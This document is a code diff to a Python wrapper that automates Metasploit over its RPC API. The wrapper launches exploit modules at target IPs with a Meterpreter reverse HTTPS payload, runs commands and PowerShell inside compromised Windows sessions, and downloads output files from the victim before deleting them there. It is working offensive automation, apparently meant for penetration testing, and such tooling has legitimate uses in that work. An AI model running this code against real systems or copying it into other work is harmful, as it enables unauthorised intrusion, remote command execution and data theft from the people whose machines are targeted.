@@ -1,5 +1,6 @@
 import asyncio
-from IPython import embed
+import os
+#from IPython import embed
 
 class MsfWrapper:
 
@@ -10,13 +11,15 @@ class MsfWrapper:
     def debug_info(self, output, label, label_num):
         if output:
             for l in output.splitlines():
-                print(l+' '+ label + ' ' + label_num)
+                print('[DEBUG] {} {} output: {}'.format(label, label_num, l))
         else:
             print('Metasploit returned None instead of output '+label+' '+label_num)
 
 
     async def get_sessions(self):
-        ''' Get list of MSF sessions from RPC server '''
+        '''
+        Get list of MSF sessions from RPC server 
+        '''
         msf_sessions = self.client.call('session.list')
 
         for msf_sess_num in msf_sessions:
@@ -26,11 +29,16 @@ class MsfWrapper:
             if msf_sess_num_str not in self.sess_data:
                 await self.update_session(msf_sess_num_str, msf_sessions)
 
+
     async def update_session(self, msf_sess_num_str, msf_sessions):
+        '''
+        Creates new session data dictionary with updated and new values
+        '''
         self.sess_data[msf_sess_num_str] = msf_sessions[int(msf_sess_num_str)]
 
+        # There's gotta be a better of doing this
         # Set the keys all to utf8
-        self.sess_data[msf_sess_num_str] = {k.decode('utf8'): v for k,v in self.sess_data[msf_sess_num_str].items()}
+        self.sess_data[msf_sess_num_str] = {k.decode('utf8'): v for k,v in self.sess_data[msf_sess_num_str].items() if isinstance(k, bytes)}
         # Set all the values to utf8
         self.sess_data[msf_sess_num_str] = {k:v.decode('utf8') for k,v in self.sess_data[msf_sess_num_str].items() if isinstance(v, bytes)}
 
@@ -43,47 +51,47 @@ class MsfWrapper:
         self.sess_data[msf_sess_num_str]['errors'] = []
         self.sess_data[msf_sess_num_str]['session_number'] = msf_sess_num_str
         self.sess_data[msf_sess_num_str]['in_os_shell'] = 'False'
+        await self.get_user(msf_sess_num_str)
 
-# If we include this we'd need to pass loop to this class and i want to avoid that
-#    async def get_user(self, sess_num):
-#        cmd = 'getuid'
-#        end_strs = [b'Server username:']
-#        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
-#       
-#        if err:
-#            print(err)#####
-#            print('Session appears to be dead', 'Session', sess_num)####
-#            self.sess_data[sess_num][b'user'] = 'ERROR'
-#            self.sess_data[sess_num][b'errors'].append(cmd)
-#        else:
-#            user = output.split(b'Server username: ')[-1].strip()
-#            self.sess_data[sess_num][b'user'] = user
-#            print(user)###
 
-    async def run_console_cmd(self, c_id, cmd, end_strs):
+    async def get_user(self, sess_num):
+        '''
+        Gets user data from session
+        '''
+        cmd = 'getuid'
+        end_strs = ['server username:']
+        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
+       
+        if err:
+            self.sess_data[sess_num]['user'] = 'ERROR'
+            self.sess_data[sess_num]['errors'].append(cmd)
+        else:
+            user = output.split('Server username: ')[-1].strip()
+            self.sess_data[sess_num]['user'] = user
+
+
+    async def run_console_cmd(self, c_id, cmd):
         '''
         Runs module and gets output
         '''
         # Only console.xxx API calls require \n in cmds
         # session.xxx API calls do not require \n
         cmd = cmd + '\n'
-        #cmd_split = cmd.splitlines()
-        #module = cmd_split[0].split()[1]
-        #print_info('Running MSF module [{}]'.format(module), 'Console', c_id)
-        #print('Running cmd [{}]'.format(cmd))
+
         self.client.call('console.write',[c_id, cmd])
 
-        output = await self.get_console_output(c_id, end_strs)
+        output = await self.get_console_output(c_id)
+        self.debug_info(output, 'Console', c_id)###
         err = self.get_output_errors(output, cmd)
 
         return (output, err)
 
 
-    async def run_msf_module(self, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs):
+    async def run_msf_module(self, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd):
 
-        payload = 'windows/x64/meterpreter/reverse_https'
+        payload = 'windows/x64/meterpreter/reverse_https' #####TODO
         cmd = create_msf_cmd(mod, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)
-        mod_out, err = await self.run_console_cmd(c_id, cmd, end_strs)
+        mod_out, err = await self.run_console_cmd(c_id, cmd)
 
         return (cmd, mod_out, err)
 
@@ -99,7 +107,7 @@ class MsfWrapper:
         return cmds
 
 
-    async def get_console_output(self, c_id, end_strs, timeout=20):
+    async def get_console_output(self, c_id, timeout=20):
         '''
         The only way to get console busy status is through console.read or console.list
         console.read clears the output buffer so you gotta use console.list
@@ -119,24 +127,26 @@ class MsfWrapper:
         # Get any initial output
         output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
 
+        # Make sure the console is not busy
         while self.client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
             output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
             await asyncio.sleep(sleep_secs)
             counter += sleep_secs
 
-        while True:
-            output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
+        # 
+        #while True:
+        #    output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
 
-            if end_strs:
+        #    if end_strs:
 
-                if any(end_str in output.lower() for end_str in end_strs):
-                    break
+        #        if any(end_str in output.lower() for end_str in end_strs):
+        #            break
 
-            if counter > timeout:
-                break
+        #    if counter > timeout:
+        #        break
 
-            await asyncio.sleep(sleep_secs)
-            counter += sleep_secs
+        #    await asyncio.sleep(sleep_secs)
+        #    counter += sleep_secs
 
         # Get remaining output
         output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
@@ -154,16 +164,11 @@ class MsfWrapper:
         
         await self.make_session_busy(sess_num)
 
-        #print_info('Running [{}]'.format(cmd.strip()), 'Session', sess_num)
-        print('Running [{}]'.format(cmd.strip()), 'Session', sess_num, api_call)
-
         res = self.client.call('session.meterpreter_{}'.format(api_call), [sess_num, cmd])
 
         # Error from MSF API
         if b'error_message' in res:
             err_msg = res[b'error_message'].decode('utf8')
-            #print_bad(error_msg.format(sess_num, err_msg), 'Session', sess_num)
-            print(error_msg.format(sess_num, err_msg), 'Session', sess_num)
             self.sess_data[sess_num]['errors'].append(err_msg)
             self.make_session_not_busy(sess_num)
             return (None, err_msg)
@@ -182,28 +187,23 @@ class MsfWrapper:
 
                     output, err = self.get_output(sess_num)
                     if output:
-                        print(output)####
+                        self.debug_info(output, 'Session', sess_num)###
                         full_output += output
 
                     # Error from meterpreter console
                     if err:
                         self.sess_data[sess_num]['errors'].append(err)
-                        #print_bad('Meterpreter error: {}'.format(err), 'Session', sess_num)
                         break
 
                     # Check for errors from cmd's output
                     err = self.get_output_errors(full_output, cmd)
                     if err:
-                        #error_printing(sess_num, self.sess_data, err, cmd)
-                        print('***ERROR'+err)####
                         break
 
                     # If no terminating string specified just wait til timeout
                     counter += sleep_secs
                     if counter > timeout:
                         err = 'Command [{}] timed out'.format(cmd.strip())
-                        print('***ERROR'+err)####
-                        #error_printing(sess_num, self.sess_data, err, cmd)
                         break
 
                     # Successfully completed
@@ -221,10 +221,8 @@ class MsfWrapper:
                 # Get the last of the data to clear the buffer
                 clear_buffer = self.client.call('session.meterpreter_read', [sess_num])
                 err = 'exception below likely due to abrupt death of session'
-                #print_bad(error_msg.format(sess_num, err), 'Session', sess_num)
-                #print_bad('    '+str(e), None, None)
                 self.sess_data[sess_num]['errors'].append(err)
-                self.debug_info(full_output, 'Session', sess_num)
+                #self.debug_info(full_output, 'Session', sess_num)
                 self.make_session_not_busy(sess_num)
                 return (full_output, err)
 
@@ -232,7 +230,6 @@ class MsfWrapper:
         else:
             err = res[b'result'].decode('utf8')
             self.sess_data[sess_num]['errors'].append(err)
-            #print_bad(res[b'result'].decode('utf8'), 'Session', sess_num)
 
         # Get the last of the data to clear the buffer
         clear_buffer = self.client.call('session.meterpreter_read', [sess_num])
@@ -265,19 +262,24 @@ class MsfWrapper:
                          'operation failed',
                          'unknown command',
                          'operation timed out',
+                         'operation failed:',
                          'unknown session id',
                          'error running',
                          'failed to load extension',
                          'requesterror',
                          'is not a valid option for this module',
                          'is not recognized as an',
-                         'exploit failed: rex::',
+                         ' failed: rex::',
                          'error:     + fullyqualifiederrorid : ']
         err = None
 
         # Got an error from output
         if any(x in output.lower() for x in script_errors):
-            err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.decode('utf8').strip())
+            # This is the error that occurs when you try to run a powershell cmd
+            # while another is running so it will continuously show up if we are
+            # running a long-running PSH cmd
+            if '2148734468' not in err:
+                err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.strip())
 
         return err
 
@@ -302,7 +304,7 @@ class MsfWrapper:
 
         self.sess_data[sess_num]['write_path'] = write_path
 
-        return write_path
+        return write_path+'cache'
 
 
     async def get_env_dir(self, sess_num, cmd):
@@ -325,78 +327,88 @@ class MsfWrapper:
         works '''
 
         # Load powershell plugin
-        cmd = 'load powershell'
-        end_strs = ['extension has already been loaded', 'success']
-        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
+        output, err = await self.load_plugin(sess_num, 'powershell')
         
         # Get write path
         write_path = await self.get_writeable_path(sess_num)
-        print('WRITEDIR: '+write_path)#####
-        redir_out = ' > "{}cache"'.format(write_path)
+        redir_out = ' > "{}"'.format(write_path)
 
         cmd = 'powershell_execute \'{}{}\''.format(ps_cmd, redir_out)
         end_strs = ['command execution completed']
-        #end_strs = ['ThisStringShouldNeverAppear']
 
-        # Make powershell_execute timeout immediately
         output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
-        #if err:
-        #    # Timeouts are ineffective measures of whether the cmd is done
-        #    # because MSF doesn't have a way of changing powershell_execute
-        #    # timeout values. Timeouts are, however, effective at measuring
-        #    # when the session is back to being available so we can then
-        #    # try new PSH commands until they stop giving a specific error
-        #    if 'Rex::TimeoutError' not in err:
-        #        return err
+        if err:
+            # Timeouts are ineffective measures of whether the cmd is done
+            # because MSF doesn't have a way of changing powershell_execute
+            # timeout values. However, after the cmd times out MSF won't kill
+            # the PSH cmd; MSF will just return "operation failed: 2148734468"
+            # when you try to run a new PSH cmd until the first cmd finishes
+            if 'timed out' in err:
+                await self.wait_for_psh_cmd(sess_num, cmd)
+            else:
+                return (None, err)
 
-        # Check if cmd is done yet
-        await self.wait_for_psh_cmd(sess_num, cmd)
-        
         # Download and read remote file
-        path = '{}cache'.format(write_path)
-        output = await read_remote_file(sess_num, path)
-        output = output.decode('utf16').encode('utf8')
+        output, err = await self.read_remote_file(sess_num, write_path)
+        if output:
+            output = output.decode('utf16')
 
         self.make_session_not_busy(sess_num)
 
         return output, err
 
 
-    async def load_powershell(self):
+    async def load_plugin(self, sess_num, plugin):
         '''
-        Loads Powershell plugin in session
+        Loads plugin in session
         '''
-        self.client.call('session.meterpreter_run_single', [sess_num, 'load powershell'])
+        # Load powershell plugin
+        cmd = 'load '+plugin
+        end_strs = ['extension has already been loaded', 'success']
+        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
+
+        return (output, err)
 
 
-    async def read_remote_file(sess_num, path):
-        cmd = 'download "{}"'.format(path)
+    async def read_remote_file(self, sess_num, remote_path):
+        '''
+        Downloads and outputs a remote file's contents
+        '''
+        local_path = os.getcwd()
+        cmd = 'download "{}" {}'.format(remote_path, local_path)
         end_strs = ['[*] download   :', '[*] skipped    :']
         output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
         if err:
-            return
+            return (None, err)
 
-        cmd = 'rm "{}"'.format(path)
-        # rm will return None which is caught as the end of the command
-        output, err = await self.run_session_cmd(sess_num, cmd, end_strs, timeout=20)
+        cmd = 'rm "{}"'.format(remote_path)
+        end_strs = ['']
+        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
 
-        filename = path.split('\\')[-1]
+        # We are setting output to blank string so just to make sure
+        # the cmd completed we'll just wait a few secs
+        await asyncio.sleep(3)
+
+        filename = remote_path.split('\\')[-1]
         with open(filename, 'rb') as f:
             content = f.read()
 
-        return content
+        err = None
+        return (content, err) 
 
 
     async def wait_for_psh_cmd(self, sess_num, cmd):
+        '''
+        Wait for long running PSH cmd to finish and write to file
+        '''
         while True:
-            running_ps_cmd = cmd.split()[1][1:] # knock off the first '
-            end_str = 'Checking if [{}] has finished'.format(running_ps_cmd)
-            end_strs = [end_str]
-            checking_cmd = 'powershell_execute "write-host Checking if [{}] has finished"'.format(running_ps_cmd)
-            output, err = await self.run_session_cmd(sess_num, checking_cmd, end_strs)
+            running_ps_cmd = cmd.split()[1][1:] # get function name and knock off the first '
+            end_strs = ['finished']
+            cmd = 'powershell_execute "Write-Output \'Checking if [{}] has finished\'"'.format(running_ps_cmd)
+            output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
             if not err:
                 break
-            await asyncio.sleep(5)
+            await asyncio.sleep(1)
 
 
     async def run_shell_cmd(self, sess_num, cmd, end_strs, exit_shell=True):
